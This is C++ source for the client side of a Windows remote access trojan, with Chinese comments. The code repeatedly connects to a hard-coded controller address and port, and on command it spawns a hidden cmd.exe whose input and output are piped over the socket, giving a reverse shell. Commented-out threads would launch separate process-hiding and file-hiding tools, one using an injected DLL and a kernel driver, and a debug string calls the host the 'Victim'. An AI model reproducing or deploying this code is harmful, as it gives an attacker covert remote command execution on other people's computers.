#include "windows.h"
#include <conio.h>
#include <stdlib.h>
//#include <fstream.h>
#include <fstream>
#include <io.h>
#include <string.h>
#include <stdio.h>
# include "ihead.h"
#include <malloc.h>
#include <memory.h>

#pragma comment (lib, "ws2_32")       //socket库文件

using namespace std;


#define MAX_THREADS 3

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define MAX_PATH_BUFFER 300
#define MAX_BUFFER	4096

typedef HANDLE PIPE;
typedef struct mHandles
{
	mHandles(SOCKET& _sock, PIPE& _pipe) :sock(_sock), pipe(_pipe) {};
	SOCKET& sock;
	PIPE& pipe;
};

bool running;

const char*IPADDR = "127.0.0.1";
//;10.64.136.179//"127.0.0.1";//10.64.136.188；192.168.1.116
u_short PORT = 9000;


void readFromSocket(mHandles& handleStruct);
int CallCmd(SOCKET sock);

DWORD WINAPI GetProcHide(LPVOID lpParam);
DWORD WINAPI GetFileHide(LPVOID lpParam);


int main()
{
	//窗口隐藏
	//ShowWindow(GetConsoleWindow(),SW_HIDE);

	//进程隐藏，需相关文件已存在，即ProcessHiding.exe和Inject.dll
	DWORD  dwThreadIdArray[MAX_THREADS];
	/*CreateThread(
		NULL,
		0,
		GetProcHide,
		NULL,
		0,
		&dwThreadIdArray[0]);*/

	//文件隐藏，需相关文件已存在，即FileHiding.exe和cccc.sys
	/*CreateThread(
		NULL,
		0,
		GetFileHide,
		NULL,
		0,
		&dwThreadIdArray[1]);*/

	//Sleep(2000);						//沉睡2秒再连接server

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	
	SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in sockaddr;
	sockaddr.sin_family = PF_INET;
	sockaddr.sin_addr.S_un.S_addr = inet_addr(IPADDR);
	sockaddr.sin_port = htons(PORT);


	while (true)
	{
		//如果请求连接失败，则本次结束，下次循环继续连接
		if (connect(sock, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR)) == SOCKET_ERROR)
			continue;

		char buffer[1500];

		//test
		//recv(sock, buffer, DEFAULT_BUFLEN, NULL);
		//printf_s("***Victim~YOYOYO~~~***\n%s", buffer);

		int iResult;
		int buflen = DEFAULT_BUFLEN;
		char *msg_long;
		char *msg;

		do {
			iResult = recv(sock, buffer, buflen, NULL);

			PHDR pl = (PHDR)buffer;

			if (_strcmpi(buffer, "cmd") == 0)
			{
				CallCmd(sock);
			}
			else if (iResult > 0)
			{
				Check_out(pl, sock);

				mtutype_choice(pl->mtu_type, pl, sock);
			}
			else if (iResult == 0)
			{
				msg = "Connect closed.\n";
				msg_long = Create_struct(pl->mtu_type, 0, 0, pl->ID, NULL, NULL, msg, strlen(msg) + 1);
				send(sock, msg_long, ((PHDR)msg_long)->slice_file_len, NULL);
			}
			else
			{
				msg = "recv error.\n";
				msg_long = Create_struct(pl->mtu_type, 0, 0, pl->ID, NULL, NULL, msg, strlen(msg) + 1);
				send(sock, msg_long, ((PHDR)msg_long)->slice_file_len, NULL);
				break;
			}
		} while (iResult >= 0);

	}
	
	closesocket(sock);

	WSACleanup();

	getchar();

	system("pause");

	//exit(0);

}


DWORD WINAPI GetProcHide(LPVOID lpParam)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	char* hide = "ProcessHiding.exe";

	// Start the child process. 
	if (!CreateProcess(NULL,   // No module name (use command line)
		hide,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		printf("CreateProcess failed (%d).\n", GetLastError());
		exit(0);
	}

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

DWORD WINAPI GetFileHide(LPVOID lpParam)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	char* hide = "FileHiding.exe";

	// Start the child process. 
	if (!CreateProcess(NULL,   // No module name (use command line)
		hide,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		printf("CreateProcess failed (%d).\n", GetLastError());
		exit(0);
	}

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}


void readFromSocket(mHandles& handleStruct)
{
	int bytesReadFromSock;
	char outBuffer[MAX_BUFFER];
	char *cont;

	while (true)
	{
		bytesReadFromSock = recv(handleStruct.sock, outBuffer, sizeof(outBuffer), 0);   //接收控制端的命令
		if (bytesReadFromSock == -1)
		{
			running = false;
			cont = "recv false！\n";
			send(handleStruct.sock, cont, strlen(cont) + len + sizeof(char), NULL);
			return;
		}

		outBuffer[bytesReadFromSock] = '\0';
		if (_stricmp("exit\n", outBuffer) == 0)
		{
			running = false;
			return;
		}

		//WriteFile(句柄，将写入缓冲区，要写入字节数，实际写入字节，NUKK)
		DWORD bytesReadFromPipe;
		WriteFile(handleStruct.pipe, outBuffer, bytesReadFromSock, &bytesReadFromPipe, NULL);
	}
}

int CallCmd(SOCKET sock)
{
	SECURITY_ATTRIBUTES secAttrs;
	secAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttrs.bInheritHandle = TRUE;
	secAttrs.lpSecurityDescriptor = NULL;

	PIPE pipeInRead, pipeInWrite, pipeOutRead, pipeOutWrite;

	//用于读取cmd返回信息
	CreatePipe(&pipeInRead, &pipeInWrite, &secAttrs, 0);
	
	//用于传输命令到cmd
	CreatePipe(&pipeOutRead, &pipeOutWrite, &secAttrs, 0);

	//从调用过程的环境块中找到指定变量的内容，ComSpec的值为cmd路径
	char cmdPath[MAX_PATH_BUFFER];
	GetEnvironmentVariableA("ComSpec", cmdPath, sizeof(cmdPath));

	STARTUPINFOA sInfo = { 0 };
	sInfo.cb = sizeof(STARTUPINFO);
	sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	sInfo.wShowWindow = SW_HIDE;	//隐藏窗口
	sInfo.hStdInput = pipeOutRead;	//用于标识键盘缓存
	sInfo.hStdOutput = pipeInWrite;	//用于标识控制台窗口的缓存
	sInfo.hStdError = pipeInWrite;	//用于标识控制台窗口的缓存

	PROCESS_INFORMATION pInfo = { 0 };
	CreateProcessA(NULL,
		cmdPath,
		&secAttrs,	//返回的句柄可以被子进程继承
		&secAttrs,	//返回的句柄可以被子线程继承
		TRUE,		//调用进程中的每一个可继承的打开句柄都将被子进程继承
		0,
		NULL,
		NULL,
		&sInfo,		//决定新进程的主窗体如何显示
		&pInfo);	//接收新进程的信息

	mHandles handles = { sock, pipeOutWrite };
	CreateThread(
		&secAttrs,
		NULL,
		(LPTHREAD_START_ROUTINE)readFromSocket,
		&handles,	//向线程函数传递的参数
		NULL,
		NULL);

	char outBuffer[MAX_BUFFER];
	DWORD bytesReadFromPipe;
	running = true;

	while (sock != SOCKET_ERROR && running == true)
	{
		memset(outBuffer, 0, sizeof(outBuffer));

		//PeekNamedPipe()预览一个管道中的数据or取得管道中数据有关的信息
		PeekNamedPipe(
			pipeInRead,	//管道句柄
			NULL, NULL, NULL,
			&bytesReadFromPipe,
			NULL);

		while (bytesReadFromPipe)
		{
			if (!ReadFile(pipeInRead, outBuffer, sizeof(outBuffer), &bytesReadFromPipe, NULL))
				break;
			else
			{
				//传输返回的信息
				send(sock, outBuffer, bytesReadFromPipe, NULL);
			}
			PeekNamedPipe(pipeInRead, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
		}
	}
	TerminateProcess(pInfo.hProcess, 0);	//终止指定进程

	return 0;
}







